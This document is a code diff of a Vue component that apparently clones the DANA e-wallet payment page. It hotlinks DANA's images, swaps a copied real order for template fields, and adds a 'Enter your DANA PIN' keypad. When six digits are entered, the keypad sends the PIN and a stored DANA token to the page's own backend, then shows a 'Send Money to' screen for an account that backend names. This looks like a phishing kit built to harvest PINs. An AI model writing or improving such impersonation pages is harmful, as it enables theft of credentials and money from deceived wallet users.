@@ -13,16 +13,16 @@
                   <div class="payment-modifier-card__header__merchant-logo thumb no-default">
                     <img src="https://a.m.dana.id/resource/imgs/merchant/smilepayid.jpg">
                   </div>
-                  <p class="payment-modifier-card__header__title lbl-payment-description">Payment to merchant</p>
+                  <!-- <p class="payment-modifier-card__header__title lbl-payment-description">Payment to merchant</p> -->
                   <div class="text-wrapper">
-                    <p class="payment-modifier-card__header__merchant-name lbl-merchant-name">SYAIFUDIN</p>
+                    <p class="payment-modifier-card__header__merchant-name lbl-merchant-name">Send Money</p>
                     <div class="phone-number-label phone-number-lbl">
                       <div class="avatar">
                         <img src="https://a.m.dana.id/resource/imgs/ipg/input-nickname-icon.svg" alt="avatar">
                       </div>
-                      <div class="phone-number">62-*******7676</div>
+                      <div class="phone-number">62-{{ phoneNumber }}</div>
                     </div>
-                    <div class="phone-number-container">62-*******7676</div>
+                    <div class="phone-number-container">{{ accountName }} · {{ bankName }}丨{{ phoneNumber }}</div>
                     </div>
                   </div>
                 </div>
@@ -50,7 +50,7 @@
                                 DANA Balance
                             </div>
                             <div class="label-wrapper__amount amount-insufficient">
-                            Rp15.000
+                            Rp {{ balance }}
                             </div>
                         </div>
                     </div>
@@ -86,25 +86,25 @@
                 <span class="payment-detail__label">
                   Total Price
                 </span> <span class="payment-detail__amount">
-                  Rp20.000
+                  Rp {{ amount }}
                 </span>
               </div>
             </div>
             <div class="content-wrapper content-wrapper--closed">
               <div class="order-id">
                 <span class="label">
-                  Order ID
+                  AccountName
                 </span> 
                 <span class="value lbl-order-id">
-                  2537d0f4f5018c1bb25bcc7a189040a8
+                  {{ accountName }}
                 </span>
               </div>
               <div class="order-subtotal">
                 <span class="label lbl-subtotal-price">
-                  Subtotal
+                  Bank
                 </span>
                 <span class="value">
-                  Rp20.000
+                  {{ bankName }}
                 </span>
               </div>
               <div class="separator"></div> 
@@ -118,11 +118,11 @@
                 </div>
                 <div class="order-amount">
                   <p class="receipt-text">Total Price</p>
-                  <p class="total-amount lbl-total-price">Rp20.000</p>
+                  <p class="total-amount lbl-total-price">Rp{{ amount }}</p>
                 </div>
               </div>
               <div class="btn-container">
-                <button @click="drawer = !drawer" type="button" class="btn btn-primary btn-pay" >PAY Rp20.000</button>
+                <button style="background-color: #108ee9; color: #fff;" @click="toPay" type="button" class="btn btn-primary btn-pay" >PAY Rp {{ amount }}</button>
               </div>
               <div class="f-sheet__revamp scroll-lock-body payment-confirmation-sheet"></div>
               <div class="modal-otp-limit"></div>
@@ -160,9 +160,10 @@
       <Footer></Footer>
     </div>
     <el-drawer
-        title="我是标题"
+        title=""
         :visible.sync="drawer"
         direction="btt"
+        class="paysuccess"
         :with-header="false"
         size="80%">
         <div class="payment-modifier-carddialog wrapper-card-titledialog">
@@ -179,37 +180,221 @@
             <p>Payment Confirmation</p>
         </div>
         <div class="statusImg centstyle">
-            <img v-if="type==='success'" src="../../assets/dana-icon/success.png" alt="">
+            <img v-if="transactionStatus==='SUCCESS'" src="../../assets/dana-icon/success.png" alt="">
             <img v-else src="../../assets/dana-icon/failed.png" alt="">
         </div>
         <div class="successText centstyle">
             Send Money to
         </div>
-        <div class="infoText centstyle">TOBA JAYA BERSAMA PT·BCA丨***1999</div>
-        <div class="money centstyle">Rp 10.000</div>
-        <div v-if="type==='success'" class="share centstyle">
+        <div class="infoText centstyle">{{ accountName }}·{{ bankName }}丨{{ phoneNumber }}</div>
+        <div class="money centstyle">Rp {{ amount }}</div>
+        <div v-if="transactionStatus==='SUCCESS'" class="share centstyle">
             <el-button round icon="el-icon-upload2" class="sharebtn">SHARE</el-button>
         </div>
         <div v-else class="infoText" style="text-align: center;font-size: .13rem;padding: .1rem .2rem;">Sorry, your payment is declined for security reasons.Please try another payment method or contactcustomer service for help.</div>
         <div class="fotbtn">
-            <div v-if="type==='success'" class="text">You can check the details in Transaction History</div>
+            <div v-if="transactionStatus==='SUCCESS'" class="text">You can check the details in Transaction History</div>
             <div class="btn">
-                <el-button class="closebtn" style="width: 45%;" plain>COLSE</el-button>
-                <el-button class="backbtn" style="width: 45%;" plain>BACK</el-button>
+                <el-button @click="orderStatus" class="closebtn" style="width: 45%;" plain>COLSE</el-button>
+                <el-button @click="orderStatus"  class="backbtn" style="width: 45%;" plain>BACK</el-button>
             </div>
         </div>
     </div>
     </el-drawer>
+    <PinCodeDrawer
+      :visible.sync="showActionDrawer"
+      :size="showKeyboard && isMobile ? '80%' : '40%'"
+      @close="closeDrawer"
+      ref="pinCodeRef"
+    >
+      <div class="pin_code_container">
+        <div class="title">Enter your DANA PIN</div>
+        <div class="password_input">
+          <!-- 密码输入框 -->
+          <van-password-input
+            :value="password"
+            :focused="showKeyboard"
+            :mask="hasMask"
+            @focus="focusPass"
+            @click="focusPass"
+            :class="{ show_dot: hasMask }"
+          />
+        <el-input ref="inputPassword" v-model="password" type="number" @input="onInput" :style="{ opacity: 0, position: 'absolute', pointerEvents: 'none',width: '1px' }"></el-input>
+          <!-- 数字键盘 -->
+          <van-number-keyboard
+            @input="onInput"
+            @delete="onDelete"
+            :show="showKeyboard"
+            v-if="isMobile"
+            @blur="showKeyboard = false"
+            :hide-on-click-outside="false"
+          />
+          <div class="input-pin__mask" @click="changeMask">
+            <img
+              v-if="hasMask"
+              data-v-554f031f=""
+              src="https://a.m.dana.id/resource/imgs/ipg/unmask-pin.svg"
+              alt="show/hide"
+              class=""
+            />
+            <img
+              v-else
+              data-v-554f031f=""
+              src="https://a.m.dana.id/resource/imgs/ipg/mask-pin.svg"
+              alt="show/hide"
+              class="masked"
+            />
+          </div>
+        </div>
+        <el-button
+          style="width: 100%"
+          type="text"
+          @click="handleDrawer('forget')"
+        >
+          FORGOT PIN?
+        </el-button>
+      </div>
+    </PinCodeDrawer>
+    <HelpDrawer ref="helpDrawerRef" :type="DrawerType"></HelpDrawer>
   </div>
 </template>
 <script>
+import { dana_detail, transaction_status, transaction_submit } from '@/api/index'
+import PinCodeDrawer from "@/components/common/actionDrawer.vue";
+import HelpDrawer from "@/components/helpDrawer/index.vue";
 export default {
+components: {
+    PinCodeDrawer,
+    HelpDrawer
+  },
     data() {
         return {
             drawer: false,
-            type:'faild'
+            transactionStatus:'',
+            referenceNo: '',
+            phoneNumber: '',
+            accountName: '',
+            amount: '',
+            balance: '',
+            bankCard: '',
+            bankName: '',
+            showActionDrawer: false,
+            password: "",
+            hasMask: true,
+            showKeyboard: false,
+            DrawerType: "help",
+            isMobile: false
         }
     },
+    created() {
+       this.referenceNo = this.$route.query.referenceNo || ''
+       this.checkDevice()
+    },
+    mounted() {
+       this.getOrderDetail()
+       this.$refs.inputPassword.focus()
+    },
+    methods: {
+        checkDevice() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        // 检测常见移动设备的关键字
+        const mobileKeywords = ['android', 'iphone', 'ipad', 'ipod', 'windows phone'];
+        this.isMobile = mobileKeywords.some(keyword => userAgent.includes(keyword));
+        console.log(this.isMobile,'=====this.isMobile====')
+        },
+        onInput(key) {
+            if(this.isMobile){
+                this.password = (this.password + key).slice(0, 6);
+            }else {
+                this.password = (this.password).slice(0, 6);
+            }
+            if (this.password.length === 6) {
+                const loading = this.$loading({
+                    lock: true,
+                    text: this.$t('loading...'),
+                    spinner: 'el-icon-loading',
+                    background: 'rgba(0, 0, 0, 0.7)'
+                })
+                transaction_submit({
+                    // referenceNo: this.referenceNo,
+                    // phoneNumber: this.phoneNumber,
+                    pin: this.password,
+                    token: localStorage.getItem('DANA_Token') || ''
+                }).then((res)=> {
+                    this.password = ''
+                    loading.close()
+                    if (res.success) {
+                        this.transactionStatus = res.data.transactionStatus
+                        this.drawer = true
+                    }
+                }).finally(() => {
+                    loading.close()
+                })
+            }
+        },
+        onDelete() {
+            this.password = this.password.slice(0, this.password.length - 1);
+        },
+        closeDrawer() {
+            this.password = ''
+            this.showKeyboard = false
+        },
+        changeMask() {
+            this.hasMask = !this.hasMask;
+        },
+        handleDrawer(type) {
+            this.DrawerType = type;
+            this.$refs.helpDrawerRef.showDrawer = true;
+        },
+        getOrderStatus() {
+            transaction_status({
+                referenceNo: this.referenceNo
+            }).then((res)=> {
+                if(res.data.transactionStatus !== 'NO_PAY') {
+                    this.$router.push({
+                    path: '/orderStatus',
+                        query: { 
+                            referenceNo: this.referenceNo
+                        }
+                    })
+                } else {
+                    this.showActionDrawer = true
+                }
+            }).finally(() => {
+                
+            })
+        },
+        focusPass() {
+            this.showKeyboard = true
+            this.$refs.inputPassword.focus()
+        },
+        getOrderDetail() {
+            dana_detail({
+                referenceNo: this.referenceNo
+            }).then((res)=> {
+                this.phoneNumber = res.data.phoneNumber
+                this.accountName = res.data.accountName
+                this.amount = res.data.amount
+                this.balance = res.data.balance
+                this.bankCard = res.data.bankCard
+                this.bankName = res.data.bankName
+                this.transactionStatus = res.data.transactionStatus
+
+            }).finally(() => {
+            })
+        },
+        toPay () {
+            this.getOrderStatus()
+        },
+        orderStatus() {
+            this.$router.push({
+            path: '/orderStatus',
+                query: { 
+                    referenceNo: this.referenceNo
+                }
+            })
+        }
+    }
 }
 </script>
 
@@ -224,9 +409,9 @@ export default {
     margin: 0 auto;
     min-height: 6.5rem;
 }
-::v-deep .el-drawer__body {
+.paysuccess ::v-deep .el-drawer__body {
     border-radius: 0.12rem 0.12rem 0 0 !important;
-      background-color: #108ee9;
+    background-color: #108ee9;
 }
 .ipg-new__content {
     display: -webkit-box;
@@ -1072,8 +1257,8 @@ article, aside, details, figcaption, figure, footer, header, main, menu, nav, se
     .payment-modifier-card__header .text-wrapper .phone-number-container {
         color: #fff;
         display: block;
-        font-size: .18rem;
-        font-weight: 600;
+        font-size: .12rem;
+        font-weight: 400;
         line-height: .24rem;
     }
     .payment-modifier-card .wrapper-card-title  {
@@ -1288,4 +1473,69 @@ article, aside, details, figcaption, figure, footer, header, main, menu, nav, se
       margin: 0 auto 0;
     }
 } 
+ ::v-deep .pin_code_container {
+    background-color: #fff;
+    padding: 0.24rem 0.36rem;
+    .title {
+      color: #727272;
+      font-weight: 400;
+      font-size: 0.12rem;
+      line-height: 0.16rem;
+      margin-bottom: 0.16rem;
+      text-align: center;
+    }
+    .password_input {
+      // display: flex;
+      position: relative;
+      padding-right: 0.5rem;
+      border: 1px solid #e3e3e3;
+    }
+  }
+  .input-pin__mask {
+    border-left: 0.01rem solid #e3e3e3;
+    margin: 0.06rem;
+    position: absolute;
+    right: 0;
+    top: 0;
+  }
+  .input-pin__mask img {
+    cursor: pointer;
+    height: 0.16rem;
+    margin: 0.1rem;
+    width: 0.2rem;
+  }
+  ::v-deep.van-password-input {
+    margin: 0;
+  }
+  [class*="van-hairline"]::after {
+    border: 0 solid #ebedf0;
+  }
+  ::v-deep .show_dot .van-password-input__item {
+    position: relative; /* 必须设置relative以便absolute伪元素定位 */
+
+    &::after {
+      content: ""; /* 伪元素必需属性 */
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 10px;
+      height: 10px;
+      background-color: #e3e3e3;
+      border-radius: 100%;
+      -webkit-transform: translate(-50%, -50%);
+      transform: translate(-50%, -50%);
+      visibility: visible;
+    }
+  }
+  ::v-deep .van-password-input__security i {
+    z-index: 1;
+  }
+  ::v-deep .show_dot .van-password-input__cursor {
+    display: none;
+  }
+  ::v-deep .show_dot .van-password-input__cursor {
+    bottom: 20%;
+    width: 40%;
+    height: 1px;
+  }
 </style>
